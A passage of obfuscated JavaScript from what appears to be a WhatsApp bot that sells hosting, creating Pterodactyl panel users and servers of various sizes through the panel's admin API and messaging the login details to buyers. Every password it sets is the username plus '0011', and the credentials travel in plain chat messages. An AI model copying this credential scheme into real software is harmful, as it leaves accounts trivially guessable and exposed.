              'user': _0x5bba6d.id,
              'egg': parseInt(_0x5d5666),
              'docker_image': 'ghcr.io/parkervcp/yolks:nodejs_18',
              'startup': _0x2abf70,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "19240",
                'swap': 0x0,
                'disk': "19240",
                'io': 0x1f4,
                'cpu': "500"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x48a596)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x58e60f = await _0x268e51.json();
          if (_0x58e60f.errors) {
            return _0x2d94c9(JSON.stringify(_0x58e60f.errors[0x0], null, 0x2));
          }
        }
        break;
      case "18gb":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x339c5b = _0x5592c0.split(',');
          if (_0x339c5b.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x465e6f = _0x339c5b[0x0];
          let _0x59cc2b = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x339c5b[0x1] ? _0x339c5b[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x4aba57 = _0x465e6f + '18GB';
          let _0x18d2c7 = global.eggsnya;
          let _0x3e53eb = global.location;
          let _0x1c35a2 = _0x465e6f + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x59cc2b) {
            return;
          }
          let _0x19bc91 = _0x465e6f + '0011';
          let _0x3c42ab = await fetch(domain + '/api/application/users', {
            'method': "POST",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x1c35a2,
              'username': _0x465e6f,
              'first_name': _0x465e6f,
              'last_name': _0x465e6f,
              'language': 'en',
              'password': _0x19bc91
            })
          });
          let _0x1fefdf = await _0x3c42ab.json();
          if (_0x1fefdf.errors) {
            return _0x2d94c9(JSON.stringify(_0x1fefdf.errors[0x0], null, 0x2));
          }
          let _0x23e051 = _0x1fefdf.attributes;
          let _0x4351b8 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x18d2c7, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x23e051.id);
          ctf = "Hai @" + _0x59cc2b.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x23e051.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x19bc91 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x59cc2b, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x1c057c = await _0x4351b8.json();
          let _0x3db9a4 = _0x1c057c.attributes.startup;
          let _0x2abb0e = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x4aba57,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x23e051.id,
              'egg': parseInt(_0x18d2c7),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x3db9a4,
              'environment': {
                'INST': 'npm',
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "18240",
                'swap': 0x0,
                'disk': "18240",
                'io': 0x1f4,
                'cpu': "480"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x3e53eb)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x708290 = await _0x2abb0e.json();
          if (_0x708290.errors) {
            return _0x2d94c9(JSON.stringify(_0x708290.errors[0x0], null, 0x2));
          }
        }
        break;
      case '17gb':
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x1c48de = _0x5592c0.split(',');
          if (_0x1c48de.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x3f3353 = _0x1c48de[0x0];
          let _0x5542ad = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x1c48de[0x1] ? _0x1c48de[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x295224 = _0x3f3353 + '17GB';
          let _0x5d0438 = global.eggsnya;
          let _0x224d6d = global.location;
          let _0x4490ec = _0x3f3353 + '1398@gmail.com';
          akunlo = 'https://telegra.ph/file/3d91b41617cb982acf0c4.jpg';
          if (!_0x5542ad) {
            return;
          }
          let _0x139e51 = _0x3f3353 + "0011";
          let _0x3b17c0 = await fetch(domain + "/api/application/users", {
            'method': 'POST',
            'headers': {
              'Accept': 'application/json',
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x4490ec,
              'username': _0x3f3353,
              'first_name': _0x3f3353,
              'last_name': _0x3f3353,
              'language': 'en',
              'password': _0x139e51
            })
          });
          let _0x944bb2 = await _0x3b17c0.json();
          if (_0x944bb2.errors) {
            return _0x2d94c9(JSON.stringify(_0x944bb2.errors[0x0], null, 0x2));
          }
          let _0x38572b = _0x944bb2.attributes;
          let _0x2517c1 = await fetch(domain + '/api/application/nests/5/eggs/' + _0x5d0438, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x38572b.id);
          ctf = "Hai @" + _0x5542ad.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x38572b.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x139e51 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x5542ad, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x3403a3 = await _0x2517c1.json();
          let _0x37ef13 = _0x3403a3.attributes.startup;
          let _0x486db4 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x295224,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x38572b.id,
              'egg': parseInt(_0x5d0438),
              'docker_image': 'ghcr.io/parkervcp/yolks:nodejs_18',
              'startup': _0x37ef13,
              'environment': {
                'INST': 'npm',
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "17240",
                'swap': 0x0,
                'disk': "17240",
                'io': 0x1f4,
                'cpu': "450"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x224d6d)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x4ea701 = await _0x486db4.json();
          if (_0x4ea701.errors) {
            return _0x2d94c9(JSON.stringify(_0x4ea701.errors[0x0], null, 0x2));
          }
        }
        break;
      case "10gb":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x2eafbe = _0x5592c0.split(',');
          if (_0x2eafbe.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x56f1dd = _0x2eafbe[0x0];
          let _0x4f4520 = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x2eafbe[0x1] ? _0x2eafbe[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x396c8a = _0x56f1dd + "10GB";
          let _0x967c1f = global.eggsnya;
          let _0x306b92 = global.location;
          let _0xdee3a0 = _0x56f1dd + "1398@gmail.com";
          akunlo = 'https://telegra.ph/file/3d91b41617cb982acf0c4.jpg';
          if (!_0x4f4520) {
            return;
          }
          let _0x5cfb4a = _0x56f1dd + "0011";
          let _0x479dcd = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0xdee3a0,
              'username': _0x56f1dd,
              'first_name': _0x56f1dd,
              'last_name': _0x56f1dd,
              'language': 'en',
              'password': _0x5cfb4a
            })
          });
          let _0x5b4d52 = await _0x479dcd.json();
          if (_0x5b4d52.errors) {
            return _0x2d94c9(JSON.stringify(_0x5b4d52.errors[0x0], null, 0x2));
          }
          let _0xf49384 = _0x5b4d52.attributes;
          let _0xb20f15 = await fetch(domain + '/api/application/nests/5/eggs/' + _0x967c1f, {
            'method': 'GET',
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0xf49384.id);
          ctf = "Hai @" + _0x4f4520.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0xf49384.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x5cfb4a + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x4f4520, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x11852c = await _0xb20f15.json();
          let _0xa65bbd = _0x11852c.attributes.startup;
          let _0x4899cd = await fetch(domain + "/api/application/servers", {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x396c8a,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0xf49384.id,
              'egg': parseInt(_0x967c1f),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0xa65bbd,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "10240",
                'swap': 0x0,
                'disk': "10240",
                'io': 0x1f4,
                'cpu': "250"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x306b92)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x3eb68f = await _0x4899cd.json();
          if (_0x3eb68f.errors) {
            return _0x2d94c9(JSON.stringify(_0x3eb68f.errors[0x0], null, 0x2));
          }
        }
        break;
      case '15gb':
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x504613 = _0x5592c0.split(',');
          if (_0x504613.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x3ecdfe = _0x504613[0x0];
          let _0x474612 = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x504613[0x1] ? _0x504613[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0xccb3b5 = _0x3ecdfe + "15GB";
          let _0x48e3a4 = global.eggsnya;
          let _0x4b9d4e = global.location;
          let _0x5856f6 = _0x3ecdfe + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x474612) {
            return;
          }
          let _0x24c194 = _0x3ecdfe + "0011";
          let _0x3fc55e = await fetch(domain + '/api/application/users', {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x5856f6,
              'username': _0x3ecdfe,
              'first_name': _0x3ecdfe,
              'last_name': _0x3ecdfe,
              'language': 'en',
              'password': _0x24c194
            })
          });
          let _0x2cba25 = await _0x3fc55e.json();
          if (_0x2cba25.errors) {
            return _0x2d94c9(JSON.stringify(_0x2cba25.errors[0x0], null, 0x2));
          }
          let _0x5cbe7c = _0x2cba25.attributes;
          let _0x2d0b2e = await fetch(domain + "/api/application/nests/5/eggs/" + _0x48e3a4, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x5cbe7c.id);
          ctf = "Hai @" + _0x474612.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x5cbe7c.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x24c194 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x474612, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x1dcbcf = await _0x2d0b2e.json();
          let _0x75ac93 = _0x1dcbcf.attributes.startup;
          let _0x46e756 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0xccb3b5,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x5cbe7c.id,
              'egg': parseInt(_0x48e3a4),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x75ac93,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "15240",
                'swap': 0x0,
                'disk': '15240',
                'io': 0x1f4,
                'cpu': "420"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x4b9d4e)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x2c8319 = await _0x46e756.json();
          if (_0x2c8319.errors) {
            return _0x2d94c9(JSON.stringify(_0x2c8319.errors[0x0], null, 0x2));
          }
        }
        break;
      case "16gb":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x3d3fea = _0x5592c0.split(',');
          if (_0x3d3fea.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x46ff7d = _0x3d3fea[0x0];
          let _0x5b5737 = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x3d3fea[0x1] ? _0x3d3fea[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x43c2e4 = _0x46ff7d + "16GB";
          let _0x3e4fe0 = global.eggsnya;
          let _0x1e890d = global.location;
          let _0x1f9d97 = _0x46ff7d + '1398@gmail.com';
          akunlo = 'https://telegra.ph/file/3d91b41617cb982acf0c4.jpg';
          if (!_0x5b5737) {
            return;
          }
          let _0x53990c = _0x46ff7d + "0011";
          let _0x27c786 = await fetch(domain + "/api/application/users", {
            'method': 'POST',
            'headers': {
              'Accept': 'application/json',
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x1f9d97,
              'username': _0x46ff7d,
              'first_name': _0x46ff7d,
              'last_name': _0x46ff7d,
              'language': 'en',
              'password': _0x53990c
            })
          });
          let _0x405e81 = await _0x27c786.json();
          if (_0x405e81.errors) {
            return _0x2d94c9(JSON.stringify(_0x405e81.errors[0x0], null, 0x2));
          }
          let _0x47b233 = _0x405e81.attributes;
          let _0x5717ed = await fetch(domain + "/api/application/nests/5/eggs/" + _0x3e4fe0, {
            'method': 'GET',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x47b233.id);
          ctf = "Hai @" + _0x5b5737.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x47b233.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x53990c + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x5b5737, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x5e4c6e = await _0x5717ed.json();
          let _0x5b2433 = _0x5e4c6e.attributes.startup;
          let _0x3bae16 = await fetch(domain + '/api/application/servers', {
            'method': 'POST',
            'headers': {
              'Accept': 'application/json',
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x43c2e4,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x47b233.id,
              'egg': parseInt(_0x3e4fe0),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x5b2433,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "16240",
                'swap': 0x0,
                'disk': "16240",
                'io': 0x1f4,
                'cpu': "410"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x1e890d)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x5a4ce3 = await _0x3bae16.json();
          if (_0x5a4ce3.errors) {
            return _0x2d94c9(JSON.stringify(_0x5a4ce3.errors[0x0], null, 0x2));
          }
        }
        break;
      case '14gb':
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x2355cd = _0x5592c0.split(',');
          if (_0x2355cd.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x4a8c23 = _0x2355cd[0x0];
          let _0x375232 = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x2355cd[0x1] ? _0x2355cd[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x1620e3 = _0x4a8c23 + '14GB';
          let _0xf894d8 = global.eggsnya;
          let _0x5842d4 = global.location;
          let _0x1bd2d0 = _0x4a8c23 + '1398@gmail.com';
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x375232) {
            return;
          }
          let _0x33594d = _0x4a8c23 + "0011";
          let _0x3a5429 = await fetch(domain + "/api/application/users", {
            'method': 'POST',
            'headers': {
              'Accept': 'application/json',
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x1bd2d0,
              'username': _0x4a8c23,
              'first_name': _0x4a8c23,
              'last_name': _0x4a8c23,
              'language': 'en',
              'password': _0x33594d
            })
          });
          let _0x38e7af = await _0x3a5429.json();
          if (_0x38e7af.errors) {
            return _0x2d94c9(JSON.stringify(_0x38e7af.errors[0x0], null, 0x2));
          }
          let _0x3edeb7 = _0x38e7af.attributes;
          let _0xa998d4 = await fetch(domain + "/api/application/nests/5/eggs/" + _0xf894d8, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x3edeb7.id);
          ctf = "Hai @" + _0x375232.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x3edeb7.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x33594d + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x375232, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x5a37c7 = await _0xa998d4.json();
          let _0x35ce74 = _0x5a37c7.attributes.startup;
          let _0x5c9718 = await fetch(domain + '/api/application/servers', {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x1620e3,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x3edeb7.id,
              'egg': parseInt(_0xf894d8),
              'docker_image': 'ghcr.io/parkervcp/yolks:nodejs_18',
              'startup': _0x35ce74,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': '14240',
                'swap': 0x0,
                'disk': "14240",
                'io': 0x1f4,
                'cpu': '360'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x5842d4)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x485f2e = await _0x5c9718.json();
          if (_0x485f2e.errors) {
            return _0x2d94c9(JSON.stringify(_0x485f2e.errors[0x0], null, 0x2));
          }
        }
        break;
      case '13gb':
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x201741 = _0x5592c0.split(',');
          if (_0x201741.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x382e33 = _0x201741[0x0];
          let _0x4ceb34 = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x201741[0x1] ? _0x201741[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0xfefc95 = _0x382e33 + "13GB";
          let _0x18e85f = global.eggsnya;
          let _0x3b42d6 = global.location;
          let _0xf02899 = _0x382e33 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x4ceb34) {
            return;
          }
          let _0x46bdc4 = _0x382e33 + "0011";
          let _0x4c623f = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0xf02899,
              'username': _0x382e33,
